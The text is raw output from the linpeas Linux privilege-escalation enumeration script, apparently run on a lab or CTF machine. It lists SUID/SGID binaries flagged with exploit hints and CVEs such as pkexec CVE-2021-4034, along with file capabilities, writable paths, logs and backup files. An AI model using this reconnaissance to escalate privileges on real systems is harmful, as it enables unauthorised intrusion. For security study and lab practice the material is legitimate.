-rwsr-xr-x 1 root root 40K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                       
-rwsr-xr-- 1 root dip 326K Feb  9  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                   
-rwsr-xr-x 1 root root 1012K May 16  2020 /usr/sbin/exim4
-rwsr-xr-x 1 root root 44K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 root mail 88K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 155K Feb  1  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                         
-rwsr-sr-x 1 daemon daemon 55K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                
-rwsr-xr-x 1 root root 53K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)        
-rwsr-sr-x 1 root root 9.9K Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 39K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 23K Jan 28  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034                
-rwsr-xr-x 1 root root 74K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 9.9K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 15K Jan 28  2019 /usr/lib/policykit-1/polkit-agent-helper-1                                                                            
-rwsr-xr-x 1 root root 14K Aug 31  2018 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary!)                                            
-rwsr-xr-x 1 root root 455K Mar 25  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 292K Jun  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                    

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                               
-rwxr-sr-x 1 root shadow 35K May 27  2017 /sbin/unix_chkpwd                    
-rwxr-sr-x 1 root crontab 36K Mar 21  2019 /usr/bin/crontab
-rwsr-sr-x 1 root mail 88K Nov 18  2017 /usr/bin/procmail
-rwxr-sr-x 1 root mail 11K Jun 30  2020 /usr/bin/mutt_dotlock
-rwsr-sr-x 1 daemon daemon 55K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                
-rwsr-sr-x 1 root root 9.9K Apr  1  2014 /usr/bin/X
-rwxr-sr-x 1 root ssh 339K Mar 25  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 61K May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root mail 19K Nov 18  2017 /usr/bin/lockfile
-rwxr-sr-x 1 root tty 15K Oct 17  2014 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 15K Jun  2  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 27K Mar 29  2015 /usr/bin/wall
-rwxr-sr-x 1 root mlocate 35K Jun 13  2013 /usr/bin/mlocate
-rwxr-sr-x 1 root utmp 6.9K Feb 21  2011 /usr/lib/utempter/utempter
-rwxr-sr-x 1 root utmp 15K Dec  5  2014 /usr/lib/libvte-2.91-0/gnome-pty-helper
-rwxr-sr-x 1 root mail 15K Jul 25  2018 /usr/lib/evolution/camel-lock-helper-1.2                                                                              
-rwxr-sr-x 1 root utmp 15K Jun 23  2014 /usr/lib/libvte-2.90-9/gnome-pty-helper

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                        
files with acls in searched folders Not Found                                  
                                                                               
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                
══╣ Current shell capabilities                                                 
./linpeas.sh: 7794: ./linpeas.sh: [[: not found                                
CapInh:  [Invalid capability format]
./linpeas.sh: 7794: ./linpeas.sh: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7785: ./linpeas.sh: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7794: ./linpeas.sh: [[: not found
CapBnd:  [Invalid capability format]

╚ Parent process capabilities
./linpeas.sh: 7819: ./linpeas.sh: [[: not found                                
CapInh:  [Invalid capability format]
./linpeas.sh: 7819: ./linpeas.sh: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7810: ./linpeas.sh: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7819: ./linpeas.sh: [[: not found
CapBnd:  [Invalid capability format]


Files with capabilities (limited to 50):
/bin/ping = cap_net_raw+ep
/bin/ping6 = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/arping = cap_net_raw+ep

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                        
/etc/ld.so.conf                                                                
Content of /etc/ld.so.conf:                                                    
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                  
  - /usr/local/lib                                                             
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                      
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                              
total 28                                                                       
drwxr-xr-x   2 root root  4096 Mar 17  2021 .
drwxr-xr-x 141 root root 12288 Dec 14 02:28 ..
-rw-r--r--   1 root root   663 Mar 22  2014 bash_completion.sh
-rw-r--r--   1 root root  1940 Dec  5  2014 vte-2.91.sh
-rw-r--r--   1 root root  1881 Jun 23  2014 vte.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                  
                                                                               
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  445 May 19  2019 usr.sbin.cups-browsed                 
-rw-r--r-- 1 root root 4959 Jun  7  2020 usr.sbin.cupsd

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                   
═╣ Credentials in fstab/mtab? ........... No                                   
═╣ Can I read shadow files? ............. No                                   
═╣ Can I read shadow plists? ............ No                                   
═╣ Can I write shadow plists? ........... No                                   
═╣ Can I read opasswd file? ............. No                                   
═╣ Can I write in network-scripts? ...... No                                   
═╣ Can I read root folder? .............. No                                   
                                                                               
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                         
/home/asta/.bash_history
/home/asta/local.txt
/root/
/var/www
/var/www/html
/var/www/html/status-admin
/var/www/html/index.html
/var/www/html/status
/var/www/html/website
/var/www/html/website/LICENSE
/var/www/html/website/styles
/var/www/html/website/styles/style.css
/var/www/html/website/index.html
/var/www/html/website/robots.txt
/var/www/html/website/README.md
/var/www/html/website/scripts
/var/www/html/website/scripts/script.js
/var/www/html/website/images
/var/www/html/website/images/.DS_Store
/var/www/html/website/images/christina-wocintechchat-com-unsplash-2.jpg
/var/www/html/website/images/parker-johnson-unsplash.jpg
/var/www/html/website/images/joanna-nix-unsplash.jpg
/var/www/html/website/images/makson-serpa-unsplash.jpg
/var/www/html/website/images/favicon.ico
/var/www/html/website/images/christina-wocintechchat-com-unsplash-1.jpg
/var/www/html/website/images/agung-rusdy-unsplash.jpg
/var/www/html/robots.txt
/var/www/html/CFIDE
/var/www/html/CFIDE/Administrator

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)                                                                          
-rw-r--r-- 1 root root 941 Mar 26  2021 /home/asta/local.txt                   

╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                                       
-rw-r----- 1 root dip 656 Mar 17  2021 /etc/chatscripts/provider               
-rw-r----- 1 root dip 1093 Mar 17  2021 /etc/ppp/peers/provider

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)                                                           
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                              
/dev/mqueue                                                                    
/dev/shm
/home/asta
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/lib/php5/sessions
/var/mail/asta
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                              
  Group lpadmin:                                                               
/usr/share/ppd/custom                                                          



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                           
                            ╚═════════════════════════╝                        
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                      
/usr/bin/gettext.sh                                                            

╔══════════╣ Executable files potentially added by user (limit 70)
2025-12-14+02:54:41.2890280980 /tmp/linpeas.sh                                 

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                       
drwxr-xr-x  3 root root 4096 Mar 24  2021 .
drwxr-xr-x 22 root root 4096 Mar 24  2021 ..
drwxr-xr-x  2 root root 4096 Mar 24  2021 black

╔══════════╣ Unexpected in root
/vmlinuz.old                                                                   
/initrd.img
/vmlinuz
/initrd.img.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/etc/vmware-tools/tools.conf                                                   
/var/log/syslog
/var/log/messages
/var/log/kern.log
/var/log/daemon.log
/var/log/auth.log
/var/mail/asta

logrotate 3.8.7
╔══════════╣ Syslog configuration (limit 50)
                                                                               


$ModLoad imuxsock # provides support for local system logging
$ModLoad imklog   # provides kernel logging support





$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

$FileOwner root
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf



auth,authpriv.*                 /var/log/auth.log
*.*;auth,authpriv.none          -/var/log/syslog
daemon.*                        -/var/log/daemon.log
kern.*                          -/var/log/kern.log
lpr.*                           -/var/log/lpr.log
mail.*                          -/var/log/mail.log
user.*                          -/var/log/user.log

mail.info                       -/var/log/mail.info
mail.warn                       -/var/log/mail.warn
mail.err                        /var/log/mail.err

news.crit                       /var/log/news/news.crit
news.err                        /var/log/news/news.err
news.notice                     -/var/log/news/news.notice

*.=debug;\
        auth,authpriv.none;\
        news.none;mail.none     -/var/log/debug
*.=info;*.=notice;*.=warn;\
        auth,authpriv.none;\
        cron,daemon.none;\
        mail,news.none          -/var/log/messages

*.emerg                         :omusrmsg:*

╔══════════╣ Auditd configuration (limit 50)
auditd configuration Not Found                                                 
╔══════════╣ Log files with potentially weak perms (limit 50)                  
306415   72 -rw-r-----   1 root     adm         71073 Mar 26  2021 /var/log/apt/term.log.1.gz                                                                 
264066    0 -rw-r-----   1 root     adm             0 Dec 14 01:02 /var/log/apt/term.log                                                                      
264082  612 -rw-r-----   1 root     adm        624171 Dec 14 02:55 /var/log/syslog                                                                            
264677  176 -rw-r-----   1 root     adm        172922 Dec 14 00:57 /var/log/debug.1                                                                           
306426  372 -rw-r-----   1 root     adm        377354 Dec 14 02:55 /var/log/messages                                                                          
264672  504 -rw-r-----   1 root     adm        510602 Dec 14 01:02 /var/log/daemon.log.1                                                                      
306405  392 -rw-r-----   1 root     adm        400650 Dec 14 02:55 /var/log/kern.log                                                                          
264678 1196 -rw-r-----   1 root     adm       1217112 Dec 14 01:02 /var/log/messages.1                                                                        
264676  540 -rw-r-----   1 root     adm        545564 Dec 14 00:58 /var/log/user.log.1                                                                        
306424  124 -rw-r-----   1 root     adm        125253 Dec 14 02:28 /var/log/user.log                                                                          
262169   96 -rw-r-----   1 root     adm         94576 Dec 14 02:54 /var/log/daemon.log                                                                        
262171  148 -rw-r-----   1 root     adm        147631 Mar 24  2021 /var/log/messages.2.gz                                                                     
262178   52 -rw-r-----   1 root     adm         49873 Mar 24  2021 /var/log/user.log.2.gz                                                                     
263000    4 -rw-r-----   1 root     adm            31 Mar 17  2021 /var/log/fsck/checkfs                                                                      
262999    4 -rw-r-----   1 root     adm            31 Mar 17  2021 /var/log/fsck/checkroot                                                                    
262170    4 -rw-r-----   1 root     adm          2637 Mar 24  2021 /var/log/auth.log.2.gz                                                                     
262173    8 -rw-r-----   1 root     adm          7797 Mar 24  2021 /var/log/debug.2.gz                                                                        
306428    4 -rw-r-----   1 root     adm           939 Dec 14 01:26 /var/log/vsftpd.log                                                                        
264673  816 -rw-r-----   1 root     adm        831421 Dec 14 00:57 /var/log/kern.log.1                                                                        
262168 1084 -rw-r-----   1 root     adm       1102146 Dec 14 01:02 /var/log/syslog.1                                                                          
264675 1044 -rw-r-----   1 root     adm       1061921 Dec 14 00:57 /var/log/auth.log.1                                                                        
262172  104 -rw-r-----   1 root     adm        104663 Mar 24  2021 /var/log/kern.log.2.gz                                                                     
306422   80 -rw-r-----   1 root     adm         81469 Mar 27  2021 /var/log/syslog.2.gz                                                                       
262174    4 -rw-r-----   1 root     adm           112 Apr  7  2021 /var/log/cups/access_log.1                                                                 
262926    0 -rw-r-----   1 root     adm             0 Dec 14 01:02 /var/log/cups/access_log                                                                   
262175    0 -rw-r-----   1 root     adm             0 Mar 17  2021 /var/log/cups/error_log                                                                    
262176    0 -rw-r-----   1 root     adm             0 Mar 17  2021 /var/log/cups/page_log                                                                     
306423    8 -rw-r-----   1 root     adm          6531 Dec 14 02:55 /var/log/auth.log                                                                          
306425  148 -rw-r-----   1 root     adm        150689 Dec 14 02:28 /var/log/debug                                                                             
305821   56 -rw-r-----   1 root     adm         56171 Mar 26  2021 /var/log/syslog.3.gz                                                                       
305818   68 -rw-r-----   1 root     adm         61906 Dec 14 00:57 /var/log/ufw.log.1                                                                         
264671  160 -rw-r-----   1 root     adm        162113 Mar 19  2021 /var/log/syslog.5.gz                                                                       
262998    4 -rw-r-----   1 root     adm            31 Mar 17  2021 /var/log/dmesg                                                                             
306427    8 -rw-r-----   1 root     adm          4764 Dec 14 01:26 /var/log/ufw.log                                                                           
306404   52 -rw-r-----   1 root     adm         49858 Mar 24  2021 /var/log/daemon.log.2.gz                                                                   
305930   68 -rw-r-----   1 root     adm         68616 Mar 24  2021 /var/log/syslog.4.gz                                                                       

╔══════════╣ Files inside /home/asta (limit 20)
total 92                                                                       
drwx------ 17 asta asta 4096 Apr  7  2021 .
drwxr-xr-x  4 root root 4096 Mar 24  2021 ..
lrwxrwxrwx  1 root root    9 Mar 27  2021 .bash_history -> /dev/null
-rwx------  1 asta asta  220 Mar 17  2021 .bash_logout
-rwx------  1 asta asta 3515 Mar 17  2021 .bashrc
drwx------  7 asta asta 4096 Apr  7  2021 .cache
drwx------ 11 asta asta 4096 Apr  7  2021 .config
drwx------  3 asta asta 4096 Apr  7  2021 .dbus
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Desktop
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Documents
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Downloads
drwx------  3 asta asta 4096 Apr  7  2021 .gconf
drwx------  2 asta asta 4096 Dec 14 02:55 .gnupg
-rw-------  1 asta asta  318 Apr  7  2021 .ICEauthority
drwx------  3 asta asta 4096 Apr  7  2021 .local
-rw-r--r--  1 root root  941 Mar 26  2021 local.txt
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Music
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Pictures
-rwx------  1 asta asta  675 Mar 17  2021 .profile
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Public
drwx------  2 asta asta 4096 Apr  7  2021 .ssh
drwxr-xr-x  2 asta asta 4096 Apr  7  2021 Templates

╔══════════╣ Files inside others home (limit 20)
/var/www/html/status-admin                                                     
/var/www/html/index.html
/var/www/html/status
/var/www/html/website/LICENSE
/var/www/html/website/styles/style.css
/var/www/html/website/index.html
/var/www/html/website/robots.txt
/var/www/html/website/README.md
/var/www/html/website/scripts/script.js
/var/www/html/website/images/.DS_Store
/var/www/html/website/images/christina-wocintechchat-com-unsplash-2.jpg
/var/www/html/website/images/parker-johnson-unsplash.jpg
/var/www/html/website/images/joanna-nix-unsplash.jpg
/var/www/html/website/images/makson-serpa-unsplash.jpg
/var/www/html/website/images/favicon.ico
/var/www/html/website/images/christina-wocintechchat-com-unsplash-1.jpg
/var/www/html/website/images/agung-rusdy-unsplash.jpg
/var/www/html/robots.txt
/var/www/html/CFIDE/Administrator/login.php
/var/www/html/CFIDE/Administrator/css/swiper.min.css

╔══════════╣ Searching installed mail applications
exim                                                                           
sendmail

╔══════════╣ Mails (limit 50)
264050    4 -rw-rw----   1 asta     mail         1410 Dec 14 02:55 /var/mail/asta                                                                             
264050    4 -rw-rw----   1 asta     mail         1410 Dec 14 02:55 /var/spool/mail/asta                                                                       

╔══════════╣ Backup folders
drwxr-xr-x 3 root root 4096 Dec 14 01:02 /var/backups                          
total 4516
-rw-r--r-- 1 root root    112640 Mar 27  2021 alternatives.tar.0
-rw-r--r-- 1 root root      5332 Mar 24  2021 alternatives.tar.1.gz
-rw-r--r-- 1 root root      5174 Mar 17  2021 alternatives.tar.2.gz
-rw-r--r-- 1 root root     90988 Mar 26  2021 apt.extended_states.0
-rw-r--r-- 1 root root     10055 Mar 24  2021 apt.extended_states.1.gz
-rw-r--r-- 1 root root      9897 Mar 19  2021 apt.extended_states.2.gz
-rw-r--r-- 1 root root      9894 Mar 17  2021 apt.extended_states.3.gz
-rw-r--r-- 1 root root      9826 Mar 17  2021 apt.extended_states.4.gz
-rw-r--r-- 1 root root      1153 Mar 19  2021 dpkg.diversions.0
-rw-r--r-- 1 root root       357 Mar 19  2021 dpkg.diversions.1.gz
-rw-r--r-- 1 root root       357 Mar 19  2021 dpkg.diversions.2.gz
-rw-r--r-- 1 root root       357 Mar 19  2021 dpkg.diversions.3.gz
-rw-r--r-- 1 root root       318 Mar 17  2021 dpkg.diversions.4.gz
-rw-r--r-- 1 root root       318 Mar 17  2021 dpkg.diversions.5.gz
-rw-r--r-- 1 root root       378 Mar 17  2021 dpkg.statoverride.0
-rw-r--r-- 1 root root       245 Mar 17  2021 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root       245 Mar 17  2021 dpkg.statoverride.2.gz
-rw-r--r-- 1 root root       245 Mar 17  2021 dpkg.statoverride.3.gz
-rw-r--r-- 1 root root       245 Mar 17  2021 dpkg.statoverride.4.gz
-rw-r--r-- 1 root root       245 Mar 17  2021 dpkg.statoverride.5.gz
-rw-r--r-- 1 root root   1787525 Mar 26  2021 dpkg.status.0
-rw-r--r-- 1 root root    507747 Mar 26  2021 dpkg.status.1.gz
-rw-r--r-- 1 root root    505028 Mar 24  2021 dpkg.status.2.gz
-rw-r--r-- 1 root root    494057 Mar 19  2021 dpkg.status.3.gz
-rw-r--r-- 1 root root    493449 Mar 17  2021 dpkg.status.4.gz
-rw-r--r-- 1 root root    481299 Mar 17  2021 dpkg.status.5.gz
-rw------- 1 root root       991 Mar 26  2021 group.bak
-rw------- 1 root shadow     827 Mar 26  2021 gshadow.bak
-rw------- 1 root root      2343 Mar 26  2021 passwd.bak
drwxr-xr-x 2 root root      4096 Mar 27  2021 reminder
-rw------- 1 root shadow    1495 Mar 27  2021 shadow.bak

drwxr-xr-x 2 root root 4096 Jan 15  2016 /var/cache/dbconfig-common/backups
total 0

drwxr-xr-x 2 root root 4096 Mar 17  2021 /var/lib/firebird/2.5/backup
total 0
-rw-r--r-- 1 root root 0 Feb 29  2020 no_empty


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 673 Mar 17  2021 /etc/xml/xml-core.xml.old              
-rw-r--r-- 1 root root 3557 Mar 17  2021 /etc/xml/catalog.old
-rw-r--r-- 1 root root 10151 Mar 17  2021 /etc/xml/docbook-xml.xml.old
-rw-r--r-- 1 root root 339 Mar 17  2021 /etc/xml/docutils-common.xml.old
-rw-r--r-- 1 root root 1219 Mar 17  2021 /etc/xml/sgml-data.xml.old
-rw-r--r-- 1 root root 20 Feb 13  2015 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 7824 Jun  9  2020 /lib/modules/3.16.0-11-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7568 Dec  3  2017 /lib/modules/3.16.0-4-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 27368 Feb 13  2015 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 26616 Apr 26  2019 /usr/lib/evolution/3.12/modules/module-backup-restore.so
-rwxr-xr-x 1 root root 31104 Apr 26  2019 /usr/lib/evolution/3.12/evolution-backup                                                                            
-rw-r--r-- 1 root root 475 Feb  6  2015 /usr/share/tracker/tracker-backup.xml
-rw-r--r-- 1 root root 2433 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-where.page                                                                
-rw-r--r-- 1 root root 3547 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-thinkabout.page                                                           
-rw-r--r-- 1 root root 2318 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-frequency.page                                                            
-rw-r--r-- 1 root root 1363 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-restore.page                                                              
-rw-r--r-- 1 root root 1373 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-why.page                                                                  
-rw-r--r-- 1 root root 2513 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-how.page                                                                  
-rw-r--r-- 1 root root 2685 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-what.page                                                                 
-rw-r--r-- 1 root root 1934 Oct 20  2014 /usr/share/help/sr@latin/gnome-help/backup-check.page                                                                
-rw-r--r-- 1 root root 2546 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3596 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2294 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1617 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1551 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2657 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2802 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2122 Oct 20  2014 /usr/share/help/sv/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2504 Apr 26  2019 /usr/share/help/sv/evolution/backup-restore.page
-rw-r--r-- 1 root root 2772 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3823 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2507 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1829 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1769 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2864 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3013 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2321 Oct 20  2014 /usr/share/help/cs/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2504 Apr 26  2019 /usr/share/help/cs/evolution/backup-restore.page
-rw-r--r-- 1 root root 2303 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3354 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2038 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1360 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1300 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2395 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2544 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1852 Oct 20  2014 /usr/share/help/nl/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2305 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3356 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2040 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1362 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1302 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2397 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2546 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1854 Oct 20  2014 /usr/share/help/kn/gnome-help/backup-check.page
-rw-r--r-- 1 root root 4137 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-where.page
-rw-r--r-- 1 root root 4942 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 3776 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2646 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 2563 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4265 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-how.page
-rw-r--r-- 1 root root 4826 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-what.page
-rw-r--r-- 1 root root 3178 Oct 20  2014 /usr/share/help/mr/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3915 Oct 20  2014 /usr/share/help/as/gnome-help/backup-where.page
-rw-r--r-- 1 root root 4857 Oct 20  2014 /usr/share/help/as/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 3643 Oct 20  2014 /usr/share/help/as/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2601 Oct 20  2014 /usr/share/help/as/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1660 Oct 20  2014 /usr/share/help/as/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4242 Oct 20  2014 /usr/share/help/as/gnome-help/backup-how.page
-rw-r--r-- 1 root root 4854 Oct 20  2014 /usr/share/help/as/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2954 Oct 20  2014 /usr/share/help/as/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3928 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-where.page
-rw-r--r-- 1 root root 4893 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 3851 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2520 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 2193 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4044 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-how.page
-rw-r--r-- 1 root root 4718 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2894 Oct 20  2014 /usr/share/help/gu/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2985 Oct 20  2014 /usr/share/help/it/gnome-help/backup-where.page
-rw-r--r-- 1 root root 4003 Oct 20  2014 /usr/share/help/it/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2668 Oct 20  2014 /usr/share/help/it/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1830 Oct 20  2014 /usr/share/help/it/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1906 Oct 20  2014 /usr/share/help/it/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2934 Oct 20  2014 /usr/share/help/it/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3143 Oct 20  2014 /usr/share/help/it/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2348 Oct 20  2014 /usr/share/help/it/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3510 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-where.page                                                                   
-rw-r--r-- 1 root root 4518 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-thinkabout.page                                                              
-rw-r--r-- 1 root root 3273 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-frequency.page                                                               
-rw-r--r-- 1 root root 2410 Oct 20  2014 /usr/share/help/pt_BR/gnome-help/backup-restore.page                                                                 
